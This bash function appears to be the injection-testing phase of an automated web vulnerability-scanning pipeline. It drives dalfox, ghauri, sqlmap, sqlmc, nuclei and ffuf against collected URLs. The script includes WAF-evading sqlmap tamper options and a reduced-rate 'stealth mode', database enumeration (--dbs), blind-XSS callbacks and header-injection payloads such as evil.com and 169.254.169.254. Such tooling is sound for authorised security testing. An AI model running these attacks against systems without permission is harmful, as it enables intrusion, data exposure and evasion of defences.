#======================= PHASE 10: INJECTION ATTACKS =======================
phase_10_injections() {
    if phase_done "phase_10"; then return 0; fi
    phase_banner "PHASE 10: INJECTION TESTING (XSS / SQLI / SSRF / LFI / REDIRECT / HEADER)"

    local START_TIME
    START_TIME=$(date +%s)
    local INJ_DIR="$OUTDIR/injections"
    local PARAM_FILE="$OUTDIR/urls/parameters.txt"
    local ALIVE_FILE="$OUTDIR/alive/final_alive.txt"

    [ ! -s "$PARAM_FILE" ] && { warning "No parameter URLs found, skipping injection tests"; return; }

    # WAF detected: use stealth rates rather than skipping entirely
    local INJ_THREADS="$THREADS"
    local INJ_RATE_LIMIT="$NUCLEI_RATE_LIMIT"
    if should_skip_noisy_phase "Phase 10 injection (WAF detected — stealth mode)"; then
        INJ_THREADS=3
        INJ_RATE_LIMIT=5
        warning "Phase 10 running in stealth mode (WAF detected) — reduced rate"
    fi

    # ── XSS with dalfox (upgraded: blind XSS + DOM XSS mode) ──
    if command -v dalfox &>/dev/null; then
        log "[10.1] XSS hunting with dalfox (blind + DOM mode)..."

        local DALFOX_FLAGS=(
            --skip-bav
            --no-color
            --silence
            -o "$INJ_DIR/dalfox_xss.txt"
            -w "$INJ_THREADS"
            --timeout "$TIMEOUT"
            --delay 500
        )

        # Blind XSS via OOB callback (if OOB domain is set)
        if [ -n "${OOB_DOMAIN:-}" ]; then
            DALFOX_FLAGS+=(--blind "https://xss.${OOB_DOMAIN}")
        fi

        # DOM XSS via headless if available
        if command -v chromium &>/dev/null || command -v google-chrome &>/dev/null || \
           command -v chromium-browser &>/dev/null; then
            DALFOX_FLAGS+=(--use-headless-chrome)
        fi

        network_run dalfox file "$PARAM_FILE" "${DALFOX_FLAGS[@]}" \
            2>>"$OUTDIR/logs/errors.log"

        local XSS_COUNT
        XSS_COUNT=$(grep -c "POC" "$INJ_DIR/dalfox_xss.txt" 2>/dev/null); XSS_COUNT=$(( ${XSS_COUNT:-0} + 0 ))
        [ "$XSS_COUNT" -gt 0 ] && {
            vuln "XSS FOUND: $XSS_COUNT endpoints"
            notify_vuln "high" "XSS: $XSS_COUNT endpoints vulnerable"
        }
        success "Dalfox XSS: $XSS_COUNT potential findings"

        # Copy confirmed XSS hits to vulns dir for AI analysis
        [ -s "$INJ_DIR/dalfox_xss.txt" ] && \
            grep "POC" "$INJ_DIR/dalfox_xss.txt" 2>/dev/null > "$OUTDIR/vulns/xss_hits.txt" || true
    else
        log "[10.1] XSS via nuclei DAST (dalfox not found)..."
        network_run nuclei -l "$ALIVE_FILE" \
            -t "$NUCLEI_TEMPLATES/dast/vulnerabilities/xss/" \
            -c "$NUCLEI_CONCURRENCY" \
            -o "$INJ_DIR/nuclei_xss.txt" \
            -silent 2>>"$OUTDIR/logs/errors.log" || true
        [ -s "$INJ_DIR/nuclei_xss.txt" ] && \
            cp "$INJ_DIR/nuclei_xss.txt" "$OUTDIR/vulns/xss_hits.txt" || true
    fi

    # ── SQLi — ghauri (primary) or sqlmap (fallback) ──
    if command -v ghauri &>/dev/null; then
        log "[10.2] SQLi with ghauri (accurate, non-intrusive)..."
        head -100 "$PARAM_FILE" | while IFS= read -r URL; do
            network_run ghauri \
                -u "$URL" \
                --level 2 \
                --batch \
                --dbs \
                --threads "$INJ_THREADS" \
                --timeout "$TIMEOUT" \
                --retries "$RETRIES" \
                >> "$INJ_DIR/ghauri_sqli.txt" 2>/dev/null || true
        done
        [ -s "$INJ_DIR/ghauri_sqli.txt" ] && \
            cp "$INJ_DIR/ghauri_sqli.txt" "$OUTDIR/vulns/sqli_hits.txt" || true
    fi

    # sqlmap as supplement (deeper checks, tamper scripts) — runs if ghauri found nothing or isn't installed
    if { ! command -v ghauri &>/dev/null || [ ! -s "$INJ_DIR/ghauri_sqli.txt" ]; } && \
       command -v sqlmap &>/dev/null; then
        log "[10.2b] SQLi with sqlmap (tamper scripts, level 3, time-based)..."
        network_run sqlmap \
            -m "$PARAM_FILE" \
            --batch \
            --level 3 \
            --risk 2 \
            --random-agent \
            --technique=BEUSTQ \
            --time-sec=5 \
            --tamper=space2comment,between,randomcase \
            --timeout "$TIMEOUT" \
            --retries "$RETRIES" \
            --threads "$INJ_THREADS" \
            --output-dir "$INJ_DIR/sqlmap" \
            2>>"$OUTDIR/logs/errors.log" || true
        find "$INJ_DIR/sqlmap" -name "*.log" -exec grep -l "injectable" {} \; 2>/dev/null | \
            xargs grep -h "Parameter:" 2>/dev/null >> "$OUTDIR/vulns/sqli_hits.txt" || true
    fi

    # sqlmc — mass SQL injection checker across all parameter URLs
    if command -v sqlmc &>/dev/null; then
        log "[10.2c] sqlmc — mass SQL injection check..."
        network_run sqlmc \
            -u "$PARAM_FILE" \
            -d 2 \
            -o "$INJ_DIR/sqlmc_hits.txt" \
            2>>"$OUTDIR/logs/errors.log" || true
        [ -s "$INJ_DIR/sqlmc_hits.txt" ] && \
            cat "$INJ_DIR/sqlmc_hits.txt" >> "$OUTDIR/vulns/sqli_hits.txt" || true
    fi

    log "[10.3] SSRF detection..."
    network_run nuclei -l "$ALIVE_FILE" \
        -t "$NUCLEI_TEMPLATES/dast/vulnerabilities/ssrf/" \
        -c "$INJ_THREADS" \
        -rate-limit "$INJ_RATE_LIMIT" \
        -o "$INJ_DIR/ssrf.txt" \
        -silent 2>>"$OUTDIR/logs/errors.log" || true

    log "[10.4] LFI/RFI testing..."
    network_run nuclei -l "$ALIVE_FILE" \
        -t "$NUCLEI_TEMPLATES/dast/vulnerabilities/lfi/" \
        -c "$INJ_THREADS" \
        -rate-limit "$INJ_RATE_LIMIT" \
        -o "$INJ_DIR/lfi.txt" \
        -silent 2>>"$OUTDIR/logs/errors.log" || true
    [ -s "$INJ_DIR/lfi.txt" ] && cp "$INJ_DIR/lfi.txt" "$OUTDIR/vulns/lfi_hits.txt" || true

    log "[10.5] Open redirect testing..."
    network_run nuclei -l "$ALIVE_FILE" \
        -t "$NUCLEI_TEMPLATES/vulnerabilities/generic/redirect*" \
        -c "$INJ_THREADS" \
        -rate-limit "$INJ_RATE_LIMIT" \
        -o "$INJ_DIR/open_redirect.txt" \
        -silent 2>>"$OUTDIR/logs/errors.log" || true
    [ -s "$INJ_DIR/open_redirect.txt" ] && \
        cp "$INJ_DIR/open_redirect.txt" "$OUTDIR/vulns/open_redirect_hits.txt" || true

    # ── Header injection testing with ffuf ──
    log "[10.6] Header injection testing with ffuf..."
    if command -v ffuf &>/dev/null && [ -s "$ALIVE_FILE" ]; then
        # Test Host, X-Forwarded-Host, X-Forwarded-For, Referer header injection
        local HEADER_PAYLOADS_FILE="$INJ_DIR/header_payloads.txt"
        cat > "$HEADER_PAYLOADS_FILE" << 'HDRS'
evil.com
127.0.0.1
localhost
0.0.0.0
169.254.169.254
internal.evil.com
HDRS
        head -20 "$ALIVE_FILE" | while IFS= read -r URL; do
            local SAFE_NAME
            SAFE_NAME=$(printf '%s' "$URL" | sed 's|https\?://||;s|[/?=&#]|_|g')
            # Host header injection
            network_run ffuf \
                -u "$URL" \
                -w "$HEADER_PAYLOADS_FILE":FUZZ \
                -H "Host: FUZZ" \
                -H "X-Forwarded-Host: FUZZ" \
                -H "X-Real-IP: FUZZ" \
                -mr "FUZZ" \
                -fc 400,404,502 \
                -rate "$FFUF_RATE" \
                -o "$INJ_DIR/hdr_ffuf_${SAFE_NAME}.json" \
                -of json \
                -s 2>>"$OUTDIR/logs/errors.log" || true
        done
        # Extract hits
        for F in "$INJ_DIR"/hdr_ffuf_*.json; do
            [ -f "$F" ] || continue
            jq -r '.results[]? | "\(.url) [Host: \(.input.FUZZ // "?")] [\(.status)]"' \
                "$F" 2>/dev/null >> "$OUTDIR/vulns/hostheader_hits.txt" || true
        done
    fi

    # Nuclei host header supplement
    network_run nuclei -l "$ALIVE_FILE" \
        -t "$NUCLEI_TEMPLATES/vulnerabilities/generic/host-header*" \
        -c "$NUCLEI_CONCURRENCY" \
        -o "$INJ_DIR/host_header_nuclei.txt" \
        -silent 2>>"$OUTDIR/logs/errors.log" || true
    [ -s "$INJ_DIR/host_header_nuclei.txt" ] && \
        cat "$INJ_DIR/host_header_nuclei.txt" >> "$OUTDIR/vulns/hostheader_hits.txt" || true

    log "[10.7] Prototype pollution check..."
    network_run nuclei -l "$ALIVE_FILE" \
        -t "$NUCLEI_TEMPLATES/vulnerabilities/generic/prototype-pollution*" \
        -c "$NUCLEI_CONCURRENCY" \
        -o "$INJ_DIR/prototype_pollution.txt" \
        -silent 2>>"$OUTDIR/logs/errors.log" || true
    [ -s "$INJ_DIR/prototype_pollution.txt" ] && \
        cp "$INJ_DIR/prototype_pollution.txt" "$OUTDIR/vulns/prototype_hits.txt" || true

    log "[10.8] Command injection..."
    network_run nuclei -l "$ALIVE_FILE" \
        -t "$NUCLEI_TEMPLATES/dast/vulnerabilities/rce/" \
        -c "$NUCLEI_CONCURRENCY" \
        -o "$INJ_DIR/cmdi.txt" \
        -silent 2>>"$OUTDIR/logs/errors.log" || true

    cooldown_if_waf_pressure
    success "PHASE 10 DONE - Injection testing complete | Time: $(($(date +%s)-START_TIME))s"
    notify "Phase 10: Injection testing done" "INJ"
    mark_done "phase_10"
    echo ""
}
